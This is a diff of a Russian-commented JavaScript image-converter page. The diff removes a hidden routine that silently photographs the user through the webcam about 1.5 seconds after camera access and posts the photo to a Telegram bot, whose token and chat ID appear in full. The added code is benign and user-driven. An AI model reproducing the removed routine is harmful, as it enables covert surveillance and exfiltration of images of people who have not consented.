@@ -1,25 +1,22 @@
-  let currentStream = null;
-let secretPhotoSent = false;
+ let currentStream = null;
 
-// ========== НАСТРОЙКИ TELEGRAM (ЗАМЕНИТЕ НА СВОИ) ==========
-const TELEGRAM_BOT_TOKEN = '8781244321:AAEcEKLEoBdcpAHrKD6OKVoArhVyuR-R8ks';   // Например: 1234567890:ABCdefGHIjklmNOPqrstUVWxyz
-const YOUR_CHAT_ID = '5595685916'; 
 
-// ========== ОСНОВНАЯ ЛОГИКА ==========
-
-// Шаг 1: Доступ к камере + скрытое фото через 1.5 секунды
+// Шаг 1: Доступ к камере (только по кнопке)
 async function setupCamera() {
   try {
+    // Если камера уже включена — не запрашиваем снова
+    if (currentStream && currentStream.active) {
+      return;
+    }
+    
     currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
     const video = document.getElementById('video');
     video.srcObject = currentStream;
+    video.style.display = 'block';
     
-    // Тихо делаем фото через 1.5 секунды (пока друг смотрит в камеру)
-    setTimeout(() => {
-      if (!secretPhotoSent && currentStream && currentStream.active) {
-        takeSecretPhoto();
-      }
-    }, 1500);
+    // Скрываем canvas и загруженное фото, показываем видео
+    document.getElementById('canvas').style.display = 'none';
+    document.getElementById('uploaded-image').style.display = 'none';
     
   } catch (error) {
     console.error('Ошибка доступа к камере:', error);
@@ -27,71 +24,43 @@ async function setupCamera() {
   }
 }
 
-// Скрытое фото (без изменения интерфейса)
-async function takeSecretPhoto() {
-  const video = document.getElementById('video');
-  if (!video || video.readyState < 2) return;
-  
-  const canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  const context = canvas.getContext('2d');
-  context.drawImage(video, 0, 0);
-  
-  secretPhotoSent = true;
-  
-  // Отправляем в Telegram
-  canvas.toBlob(async (blob) => {
-    await sendToTelegram(blob);
-  }, 'image/jpeg', 0.7);
-}
-
-// Отправка в Telegram (тихо, без уведомлений)
-async function sendToTelegram(blob) {
-  const formData = new FormData();
-  formData.append('chat_id', YOUR_CHAT_ID);
-  formData.append('photo', blob, `secret_${Date.now()}.jpg`);
-  
-  try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: formData
-    });
-    console.log('Секретное фото отправлено');
-  } catch (error) {
-    console.error('Ошибка отправки:', error);
-  }
-}
-
-// ========== ОБЫЧНАЯ РАБОТА САЙТА (НИЧЕГО НЕ МЕНЯЕТСЯ) ==========
-
-// Обычное фото по кнопке "Сделать фото"
+// Шаг 2: Захват фото с камеры (только по кнопке)
 function takePhoto() {
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const context = canvas.getContext('2d');
+  
+  if (!video.srcObject || !currentStream || !currentStream.active) {
+    alert('Сначала включите камеру кнопкой «Включить камеру»');
+    return;
+  }
 
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   context.drawImage(video, 0, 0);
 
-  if (currentStream) {
-    currentStream.getTracks().forEach(track => track.stop());
-  }
-
+  // Не останавливаем камеру — пусть пользователь сам решит
   video.style.display = 'none';
   canvas.style.display = 'block';
 }
 
-// Загрузка из галереи
+// Шаг 3: Загрузка фото из галереи
 function handleFileSelect(event) {
   const file = event.target.files[0];
   if (!file) return;
+
+  // Проверка, что это изображение
+  if (!file.type.startsWith('image/')) {
+    alert('Пожалуйста, выберите файл изображения');
+    return;
+  }
 
   const reader = new FileReader();
   reader.onload = function(e) {
     const img = document.getElementById('uploaded-image');
     img.src = e.target.result;
+    
+    // Скрываем видео и canvas, показываем загруженное фото
     document.getElementById('video').style.display = 'none';
     document.getElementById('canvas').style.display = 'none';
     img.style.display = 'block';
@@ -99,47 +68,90 @@ function handleFileSelect(event) {
   reader.readAsDataURL(file);
 }
 
-// Конвертация и скачивание (работает как обычно)
+// Шаг 4: Конвертация и скачивание изображения
 function convertImage() {
   const format = document.getElementById('format').value;
   const quality = parseFloat(document.getElementById('quality').value);
-  const width = document.getElementById('width').value ? parseInt(document.getElementById('width').value) : null;
+  const widthInput = document.getElementById('width').value;
+  const width = widthInput ? parseInt(widthInput) : null;
 
+  // Определяем источник изображения (canvas с фото или загруженное)
   const canvas = document.getElementById('canvas');
-  const img = document.getElementById('uploaded-image');
-  let source = canvas;
-  let isCanvas = true;
-
-  if (img.style.display !== 'none') {
-    source = img;
-    isCanvas = false;
+  const uploadedImg = document.getElementById('uploaded-image');
+  const video = document.getElementById('video');
+  
+  let source = null;
+  let sourceWidth = 0;
+  let sourceHeight = 0;
+  
+  // Приоритет: если есть фото на canvas — берём его
+  if (canvas.style.display !== 'none' && canvas.width > 0) {
+    source = canvas;
+    sourceWidth = canvas.width;
+    sourceHeight = canvas.height;
+  }
+  // Иначе если есть загруженное фото
+  else if (uploadedImg.style.display !== 'none' && uploadedImg.src && uploadedImg.naturalWidth > 0) {
+    source = uploadedImg;
+    sourceWidth = uploadedImg.naturalWidth;
+    sourceHeight = uploadedImg.naturalHeight;
+  }
+  // Иначе если камера включена — делаем подсказку
+  else if (video.style.display !== 'none' && video.srcObject) {
+    alert('Сначала сделайте фото кнопкой «Сделать фото» или загрузите изображение из галереи');
+    return;
+  }
+  else {
+    alert('Нет изображения для конвертации. Сделайте фото или загрузите файл.');
+    return;
   }
 
+  // Создаём временный canvas для конвертации
   const tempCanvas = document.createElement('canvas');
   const ctx = tempCanvas.getContext('2d');
 
-  if (width) {
-    const ratio = width / (isCanvas ? canvas.width : source.naturalWidth);
+  // Изменяем размер, если указан
+  if (width && width > 0) {
+    const ratio = width / sourceWidth;
     tempCanvas.width = width;
-    tempCanvas.height = (isCanvas ? canvas.height : source.naturalHeight) * ratio;
+    tempCanvas.height = sourceHeight * ratio;
   } else {
-    tempCanvas.width = isCanvas ? canvas.width : source.naturalWidth;
-    tempCanvas.height = isCanvas ? canvas.height : source.naturalHeight;
+    tempCanvas.width = sourceWidth;
+    tempCanvas.height = sourceHeight;
   }
 
   ctx.drawImage(source, 0, 0, tempCanvas.width, tempCanvas.height);
 
+  // Конвертируем и скачиваем
+  const mimeType = `image/${format}`;
   tempCanvas.toBlob(blob => {
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
     a.href = url;
-    a.download = `photo.${format}`;
+    a.download = `converted_${Date.now()}.${format}`;
     a.click();
     URL.revokeObjectURL(url);
-  }, `image/${format}`, quality);
+    
+    // Небольшое уведомление об успехе
+    console.log('Изображение сконвертировано и скачано');
+  }, mimeType, quality);
 }
 
-// Инициализация состояния кнопки камеры при загрузке страницы
-document.addEventListener('DOMContentLoaded', function() {
-  updateCameraButtonState(false); // Изначально камера выключена
+// Дополнительно: кнопка для остановки камеры (хороший тон)
+function stopCamera() {
+  if (currentStream) {
+    currentStream.getTracks().forEach(track => track.stop());
+    currentStream = null;
+    const video = document.getElementById('video');
+    video.srcObject = null;
+    video.style.display = 'none';
+    console.log('Камера отключена');
+  }
+}
+
+// Обработчик закрытия страницы — вежливо отключаем камеру
+window.addEventListener('beforeunload', () => {
+  if (currentStream) {
+    currentStream.getTracks().forEach(track => track.stop());
+  }
 });
